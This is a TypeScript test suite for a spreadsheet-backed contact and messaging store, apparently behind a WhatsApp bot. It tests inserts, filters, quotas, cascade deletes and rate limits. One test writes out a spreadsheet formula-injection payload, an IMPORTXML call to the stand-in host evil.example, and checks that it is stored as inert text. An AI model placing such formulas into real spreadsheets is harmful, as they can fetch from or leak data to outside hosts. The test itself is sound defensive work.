import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const { createGas } = require('./gas-mock.cjs');

const ok = (r: any) => {
  assert.ok(r.results, JSON.stringify(r));
  for (const x of r.results) assert.equal(x.ok, true, JSON.stringify(x));
  return r.results.map((x: any) => x.data);
};

test('rejects requests without the secret', () => {
  const gas = createGas();
  assert.equal(gas.call([{ op: 'count', table: 'contacts' }], 'wrong').error, 'unauthorized');
});

test('setup creates tabs and default settings', () => {
  const gas = createGas();
  const [settings] = ok(gas.call([{ op: 'find', table: 'settings' }]));
  const map = Object.fromEntries(settings.map((s: any) => [s.key, s.value]));
  assert.equal(map.monthly_message_limit, 2000);
  assert.deepEqual(map.business_hours.days, [1, 2, 3, 4, 5, 6]);
});

test('insert fills defaults, enforces unique keys and round-trips types', () => {
  const gas = createGas();
  const [ins] = ok(gas.call([{ op: 'insert', table: 'contacts', rows: [{ wa_id: '971500000001', name: 'Aisha' }] }]));
  const c = ins.rows[0];
  assert.match(c.id, /^[0-9a-f-]{36}$/);
  assert.equal(c.lang, 'en');
  assert.equal(c.marketing_opt_in, false);
  assert.deepEqual(c.tags, []);

  const dup = gas.call([{ op: 'insert', table: 'contacts', rows: [{ wa_id: '971500000001' }] }]).results[0];
  assert.equal(dup.ok, false);
  assert.equal(dup.code, 'conflict');
  const [ign] = ok(gas.call([{ op: 'insert', table: 'contacts', rows: [{ wa_id: '971500000001' }], ignoreConflict: true }]));
  assert.equal(ign.conflicts[0].id, c.id);

  ok(gas.call([{ op: 'update', table: 'contacts', where: { id: c.id }, patch: { tags: ['dubai', 'vip'], bot_paused: true, flow_data: { leadId: 'x' } } }]));
  const [[back]] = ok(gas.call([{ op: 'find', table: 'contacts', where: { id: c.id } }]));
  assert.deepEqual(back.tags, ['dubai', 'vip']);
  assert.equal(back.bot_paused, true);
  assert.deepEqual(back.flow_data, { leadId: 'x' });
  assert.ok(back.updated_at);
  // phone numbers stay exact text
  assert.equal(back.wa_id, '971500000001');
});

test('filters, ordering and limits', () => {
  const gas = createGas();
  ok(gas.call([{ op: 'insert', table: 'contacts', rows: [
    { wa_id: '971500000001', country: 'UAE', tags: ['a'], marketing_opt_in: true, last_inbound_at: '2026-10-01T00:00:00.000Z' },
    { wa_id: '447700900123', country: 'UK', tags: ['b'], marketing_opt_in: true, last_inbound_at: '2026-10-05T00:00:00.000Z' },
    { wa_id: '918866475352', country: 'India', marketing_opt_in: false }
  ] }]));
  const [inList, overlap, ordered, endsWith, ltNull, count] = ok(gas.call([
    { op: 'find', table: 'contacts', where: { country: { op: 'in', value: ['UAE', 'UK'] } } },
    { op: 'find', table: 'contacts', where: { tags: { op: 'overlaps', value: ['b'] } } },
    { op: 'find', table: 'contacts', where: {}, order: 'last_inbound_at', desc: true, limit: 2 },
    { op: 'find', table: 'contacts', where: { wa_id: { op: 'endswith', value: '5352' } } },
    { op: 'find', table: 'contacts', where: { last_inbound_at: { op: 'lt_or_null', value: '2026-10-03' } } },
    { op: 'count', table: 'contacts', where: { marketing_opt_in: true, opted_out: false } }
  ]));
  assert.equal(inList.length, 2);
  assert.equal(overlap[0].wa_id, '447700900123');
  assert.equal(ordered[0].wa_id, '447700900123'); // newest first, empty last
  assert.equal(endsWith[0].country, 'India');
  assert.equal(ltNull.length, 2);
  assert.equal(count, 2);
});

test('customer text that looks like a formula is stored safely and read back unchanged', () => {
  const gas = createGas();
  const evil = '=IMPORTXML("https://evil.example","//a")';
  ok(gas.call([{ op: 'insert', table: 'contacts', rows: [{ wa_id: '971500000009', name: evil }] }]));
  const [[c]] = ok(gas.call([{ op: 'find', table: 'contacts', where: { wa_id: '971500000009' } }]));
  assert.equal(c.name, evil);
  const raw = gas.sheets.get('contacts').data[1];
  assert.ok(raw.every((cell: string) => !String(cell).startsWith('=')));
});

test('inbound: creates contact, dedupes by wamid, tracks campaign replies', () => {
  const gas = createGas();
  const [first] = ok(gas.call([{ op: 'inbound', wa_id: '971500000001', profile_name: 'Aisha', wamid: 'wamid.1', type: 'text', body: 'hi', month: '2026-10' }]));
  assert.equal(first.duplicate, false);
  assert.equal(first.isNew, true);
  assert.equal(first.contact.name, 'Aisha');
  assert.equal(first.prevLastInbound, null);
  assert.equal(first.settings.monthly_message_limit, 2000);
  assert.equal(first.quotaUsed, 0);

  const [dup] = ok(gas.call([{ op: 'inbound', wa_id: '971500000001', wamid: 'wamid.1', type: 'text', body: 'hi', month: '2026-10' }]));
  assert.equal(dup.duplicate, true);

  const cid = first.contact.id;
  ok(gas.call([{ op: 'insert', table: 'campaign_recipients', rows: [{ campaign_id: 'c1', contact_id: cid, status: 'sent', sent_at: new Date().toISOString() }] }]));
  const [second] = ok(gas.call([{ op: 'inbound', wa_id: '971500000001', wamid: 'wamid.2', type: 'text', body: 'interested', month: '2026-10' }]));
  assert.ok(second.prevLastInbound);
  const [[rec]] = ok(gas.call([{ op: 'find', table: 'campaign_recipients', where: { contact_id: cid } }]));
  assert.ok(rec.replied_at);
  assert.match(rec.track_code, /^[0-9a-f]{12}$/);
  const [msgs] = ok(gas.call([{ op: 'count', table: 'messages', where: { contact_id: cid } }]));
  assert.equal(msgs, 2);
});

test('quota is atomic and respects the limit', () => {
  const gas = createGas();
  const [a, b, c, d] = ok(gas.call([
    { op: 'consume_quota', month: '2026-10', n: 3, limit: 5 },
    { op: 'consume_quota', month: '2026-10', n: 3, limit: 5 }, // would exceed
    { op: 'consume_quota', month: '2026-10', n: 2, limit: 5 },
    { op: 'release_quota', month: '2026-10', n: 1 }
  ]));
  assert.deepEqual([a, b, c, d], [true, false, true, true]);
  const [[q]] = ok(gas.call([{ op: 'find', table: 'quota_usage', where: { month: '2026-10' } }]));
  assert.equal(q.used, 4);
});

test('deleting a contact cascades to its data', () => {
  const gas = createGas();
  const [r] = ok(gas.call([{ op: 'inbound', wa_id: '971500000001', wamid: 'w1', type: 'text', body: 'hi', month: '2026-10' }]));
  const cid = r.contact.id;
  ok(gas.call([
    { op: 'insert', table: 'leads', rows: [{ contact_id: cid }] },
    { op: 'insert', table: 'handoffs', rows: [{ contact_id: cid, reason: 'x', summary: 'y' }] },
    { op: 'insert', table: 'contacts', rows: [{ wa_id: '447700900123' }] }
  ]));
  const [removed, contacts, msgs, leads, handoffs] = ok(gas.call([
    { op: 'remove', table: 'contacts', where: { id: cid } },
    { op: 'count', table: 'contacts' },
    { op: 'count', table: 'messages' },
    { op: 'count', table: 'leads' },
    { op: 'count', table: 'handoffs' }
  ]));
  assert.deepEqual([removed, contacts, msgs, leads, handoffs], [1, 1, 0, 0, 0]);
});

test('rate limit and seen use the cache', () => {
  const gas = createGas();
  const res = ok(gas.call([1, 2, 3].map(() => ({ op: 'rate_limit', key: 'login:1.2.3.4', window: 900, max: 2 }))));
  assert.deepEqual(res, [true, true, false]);
  assert.deepEqual(ok(gas.call([{ op: 'seen', key: 'k' }, { op: 'seen', key: 'k' }])), [false, true]);
});

test('cleanup trims old messages', () => {
  const gas = createGas();
  ok(gas.call([{ op: 'insert', table: 'messages', rows: [
    { contact_id: 'c', direction: 'inbound', type: 'text', body: 'old', created_at: '2020-01-01T00:00:00.000Z' },
    { contact_id: 'c', direction: 'inbound', type: 'text', body: 'new' }
  ] }]));
  const [out, left] = ok(gas.call([{ op: 'cleanup', keepDays: 60 }, { op: 'find', table: 'messages' }]));
  assert.equal(out.messages, 1);
  assert.deepEqual(left.map((m: any) => m.body), ['new']);
});
